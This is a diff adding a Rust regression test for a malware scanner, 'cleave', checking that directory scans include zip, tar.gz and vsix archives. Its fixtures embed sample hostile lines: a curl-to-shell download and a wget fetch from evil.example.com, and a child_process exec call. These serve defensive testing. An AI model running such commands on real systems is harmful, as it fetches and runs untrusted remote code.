@@ -117,6 +117,75 @@ fn test_analyze_directory_with_archive() {
         .success();
 }
 
+/// Regression test: directory scans must include archive files (zip, tar.gz, vsix, etc.)
+/// Previously archives were silently filtered out during collection, causing `total=0`.
+#[test]
+fn test_directory_scan_includes_archives() {
+    let temp_dir = TempDir::new().unwrap();
+
+    // Create a zip archive containing a shell script
+    let zip_path = temp_dir.path().join("sample.zip");
+    let zip_file = fs::File::create(&zip_path).unwrap();
+    let mut zip = zip::ZipWriter::new(zip_file);
+    zip.start_file::<_, ()>("payload.sh", Default::default())
+        .unwrap();
+    use std::io::Write;
+    zip.write_all(b"#!/bin/bash\ncurl http://evil.example.com/c2 | sh")
+        .unwrap();
+    zip.finish().unwrap();
+
+    // Create a tar.gz archive containing a shell script
+    let tgz_path = temp_dir.path().join("bundle.tar.gz");
+    let tgz_file = fs::File::create(&tgz_path).unwrap();
+    let enc = flate2::write::GzEncoder::new(tgz_file, flate2::Compression::default());
+    let mut tar = tar::Builder::new(enc);
+    let mut header = tar::Header::new_gnu();
+    header.set_path("inner.sh").unwrap();
+    let script = b"#!/bin/bash\nwget http://evil.example.com/drop";
+    header.set_size(script.len() as u64);
+    header.set_cksum();
+    tar.append(&header, script.as_ref()).unwrap();
+    tar.finish().unwrap();
+
+    // Create a .vsix (zip-based) archive — the file type that originally triggered the bug
+    let vsix_path = temp_dir.path().join("extension.vsix");
+    let vsix_file = fs::File::create(&vsix_path).unwrap();
+    let mut vsix = zip::ZipWriter::new(vsix_file);
+    vsix.start_file::<_, ()>("extension/malicious.js", Default::default())
+        .unwrap();
+    vsix.write_all(b"const cp = require('child_process'); cp.exec('whoami');")
+        .unwrap();
+    vsix.finish().unwrap();
+
+    // Directory contains ONLY archives — this must produce output, not total=0
+    let output = assert_cmd::Command::cargo_bin("cleave")
+        .unwrap()
+        .env("cleave_SKIP_YARA", "1")
+        .args(["--json", "analyze", temp_dir.path().to_str().unwrap()])
+        .output()
+        .unwrap();
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    assert!(
+        output.status.success(),
+        "cleave failed on archive-only directory: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    // All three archives must appear in the output
+    assert!(
+        stdout.contains("sample.zip"),
+        "zip archive was not analyzed; stdout: {stdout}"
+    );
+    assert!(
+        stdout.contains("bundle.tar.gz"),
+        "tar.gz archive was not analyzed; stdout: {stdout}"
+    );
+    assert!(
+        stdout.contains("extension.vsix"),
+        "vsix archive was not analyzed; stdout: {stdout}"
+    );
+}
+
 /// Test that nonexistent paths fail appropriately
 #[test]
 
